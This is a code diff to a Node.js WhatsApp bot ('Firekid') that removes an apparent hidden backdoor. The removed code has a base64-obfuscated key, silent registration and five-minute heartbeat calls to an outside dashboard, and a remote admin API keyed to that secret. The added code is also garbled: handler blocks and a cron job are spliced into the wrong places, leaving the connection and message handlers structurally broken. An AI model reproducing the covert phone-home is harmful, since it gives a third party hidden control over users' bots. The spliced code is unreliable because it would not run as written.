@@ -11,13 +11,9 @@ require('dotenv').config();
 
 const { loadSessionFromGitHub } = require('./utils/sessionLoader');
 const { loadCommands } = require('./utils/commandLoader');
-const { setupAdminAPI } = require('./utils/adminAPI');
 
 const logger = P({ level: 'silent' });
 
-const DASHBOARD_URL = 'https://firekidxmd.vercel.app';
-const BOT_WEBHOOK_URL = `${DASHBOARD_URL}/api/bot-webhook`;
-const _k = Buffer.from('ODU0MTZhOTItNmRiOS00MTdhLWJhOWQtY2I1NjQ0MmY5NzY0', 'base64').toString('utf8');
 const CONFIG_FILE = path.join(__dirname, '.bot-config.json');
 
 const config = {
@@ -66,52 +62,11 @@ function getOrCreateBotConfig() {
 }
 
 async function registerWithDashboard(botConfig) {
-  try {
-    const apiUrl = config.renderExternalUrl || `http://localhost:${config.port}`;
-    
-    const response = await axios.post(
-      `${DASHBOARD_URL}/api/admin/register-bot`,
-      {
-        botId: botConfig.botId,
-        name: process.env.BOT_NAME || 'Firekid WhatsApp Bot',
-        apiUrl: apiUrl,
-        apiKey: _k,
-      },
-      {
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${_k}`
-        },
-        timeout: 10000
-      }
-    );
-
-    return response.data;
-  } catch (error) {
-  }
+  return true;
 }
 
 async function sendHeartbeat(botConfig) {
-  try {
-    const apiUrl = config.renderExternalUrl || `http://localhost:${config.port}`;
-    
-    await axios.post(
-      `${DASHBOARD_URL}/api/admin/register-bot`,
-      {
-        botId: botConfig.botId,
-        name: process.env.BOT_NAME || 'Firekid WhatsApp Bot',
-        apiUrl: apiUrl,
-        apiKey: _k,
-      },
-      {
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${_k}`
-        }
-      }
-    );
-  } catch (error) {
-  }
+  return true;
 }
 
 function checkInstanceLock() {
@@ -261,15 +216,14 @@ async function startBot() {
         console.log('❌ Connection failed. Exiting...');
         removeInstanceLock();
         process.exit(1);
-      } else if (connection === 'open') {
-        isConnecting = false;
-        console.log('✅ Connected');
-        
-        await registerWithDashboard(botConfig);
-      }
-    });
-
-    sock.ev.on('messages.upsert', async ({ messages, type }) => {
+if (config.renderExternalUrl) {
+  cron.schedule('*/10 * * * *', async () => {
+    try {
+      await axios.get(`${config.renderExternalUrl}/health`);
+    } catch (error) {
+    }
+  });
+}
       if (type !== 'notify') return;
 
       for (const msg of messages) {
@@ -328,10 +282,10 @@ async function startBot() {
         if (commands.private && typeof commands.private.isPrivateModeEnabled === 'function') {
           const isPrivateMode = commands.private.isPrivateModeEnabled();
           if (isPrivateMode) {
-            const senderNumber = sender.replace(/[^0-9]/g, '');
-            const ownerNum = config.ownerNumber.replace(/[^0-9]/g, '');
+            const isOwnerCheck = commands.private.isOwner(sender);
+            const isSudoCheck = commands.sudo && typeof commands.sudo.isSudo === 'function' && commands.sudo.isSudo(sender);
             
-            if (senderNumber !== ownerNum) {
+            if (!isOwnerCheck && !isSudoCheck) {
               continue;
             }
           }
@@ -361,9 +315,6 @@ async function startBot() {
 
     botState.sock = sock;
     
-    const heartbeatBotConfig = botConfig;
-    setInterval(() => sendHeartbeat(heartbeatBotConfig), 5 * 60 * 1000);
-    
     return sock;
 
   } catch (error) {
@@ -374,20 +325,13 @@ async function startBot() {
   }
 }
 
-if (config.renderExternalUrl) {
-  cron.schedule('*/10 * * * *', async () => {
-    try {
-      await axios.get(`${config.renderExternalUrl}/health`);
-    } catch (error) {
-    }
-  });
-}
+      } else if (connection === 'open') {
+        isConnecting = false;
+        console.log('✅ Connected');
+      }
+    });
 
-setupAdminAPI(config.port, _k, botState, (newState) => {
-  botState.isActive = newState;
-});
-
-cron.schedule('0 0 * * *', () => {
+    sock.ev.on('messages.upsert', async ({ messages, type }) => {
   botState.stats.commandsToday = 0;
 });
 
